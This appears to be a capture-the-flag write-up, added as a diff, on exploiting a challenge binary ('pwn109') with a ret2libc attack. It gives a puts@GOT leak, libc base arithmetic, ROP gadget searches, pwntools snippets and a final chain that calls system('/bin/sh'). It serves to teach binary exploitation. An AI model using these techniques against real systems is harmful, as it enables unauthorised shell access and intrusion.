@@ -1,0 +1,72 @@
+MAIN PLAN : 
+Gain a shell by calling system("/bin/sh") from libc.
+
+
+How to do that ? : 
+	steps : 
+		1-leak a libc address
+		2-calculate libc_base
+		3-calculate system_addr (using system_offset)
+		4-calculate "/bin/sh"_addr (using bin_sh_offset)
+		5-build a rop chain to execute this
+
+1-Leak libc address: 
+to leak libc address we can call the function puts:
+	so we need to execute puts(somefunction_addr) where some function 
+	is a function that exits in libc 
+	so lets leak the address if puts itself so we need to call
+	puts(puts@GOT);:
+		in assembly that would be :
+		
+			push puts_got
+			pop rdi
+			call puts_plt	
+			
+		in order to do that we need the address of puts in our binary
+		so we can use gdb to find this : 0x401060  puts@plt or simply use puts_plt = e.plt['puts']
+		so that's the address of our puts function in the binary
+		
+		now for pop rdi we can use : ropper -f ./pwn109 --search "pop rdi; ret" and we get : 0x4012a3
+								or pwntools: rop = ROP(e)  pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+								
+		for puts_got address we use : puts_got = e.got["puts"] and we get 0x404018  or gdb : 
+			(gdb) disassemble 0x0000000000401060
+			Dump of assembler code for function puts@plt:
+			   0x0000000000401060 <+0>:     endbr64
+			   0x0000000000401064 <+4>:     bnd jmp QWORD PTR [rip+0x2fad]        # 0x404018 <puts@got.plt>
+			or in ghidra : 
+				                             PTR_puts_00404018                               XREF[1]:     puts:00401064  
+        00404018 00 50 40        addr       <EXTERNAL>::puts                                 = ??
+                 00 00 00 
+                 00 00
+
+	and now we can craft our payload but the leak of puts_got will get randomized because of ASLR each time we run the binary
+	so we need to restart the binary in the same run for that we need the main_addr ofc there are a lot of way to get that :
+		(gdb), ghidra or pwntools : main = e.symbols['main']
+	so now we are ready to craft the payload :
+						'a'* offset + pop_rdi + puts_got + puts_plt + main_addr
+						(this might seem confusing because pop is before puts_got
+						but things happen differently in rop chain than assembly)
+	now this prints the value of puts_got which is the address of puts in runtime we call it puts_addr
+2-Calculate libc_base :
+	libc = e.libc
+	puts_offset = libc.symbols["puts"]
+	libc_base = puts_addr - puts_offset			
+3-Calculate system_addr :
+	system_offset = libc.symbols["system"]
+	system_addr = libc_base + system_offset
+4-Calculate "/bin/sh"_addr:
+	bin_sh_offset = next(libc.search(b"/bin/sh"))
+	bin_sh_addr = libc_base + bin_sh_offset
+5-Build ROP Chain:
+	payload = 'a' * offset + ret_addr + pop_rdi + bin_sh_addr + system_addr	
+
+	we get ret_addr from : ropper -f ./pwn109 --search "ret"  to align the stack
+
+Now This solution runs locally but doesn't remotely so the remote server is
+using another libc so we need to figure out this libc version for that
+use https://libc.rip/ : put the puts address and check the version 
+download it then load it using libc = ELF("./libc6.so")
+
+and we get the flag , Happy Hacking :) 
+			
